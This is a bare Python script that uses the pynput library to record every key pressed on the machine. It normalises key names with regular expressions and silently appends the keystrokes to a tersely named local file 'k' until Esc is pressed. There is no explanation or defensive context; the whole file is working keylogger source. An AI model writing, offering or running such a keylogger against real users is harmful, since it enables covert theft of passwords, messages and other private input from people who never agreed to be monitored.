from pynput.keyboard import Listener, Key
import re
logFile = "k"
def writeLog(key):
    if key == Key.esc:
        return False
    keydata = str(key)
    keydata = re.sub(r'\'','',keydata)
    keydata = re.sub(r'Key.space',' ',keydata)
    keydata = re.sub(r'Key.enter','\n',keydata)
    keydata = re.sub(r'Key.shift','',keydata)
    keydata = re.sub(r'Key.alt','',keydata)
    #keydata = re.sub(r'Key.backspace','',keydata)
    keydata = re.sub(r'Key.backspace','(bs)',keydata)

    keydata = re.sub(r'Key.ctrl','',keydata)


    with open(logFile,"a") as f:
        f.write(keydata)
with Listener(on_press=writeLog) as l:
    l.join()
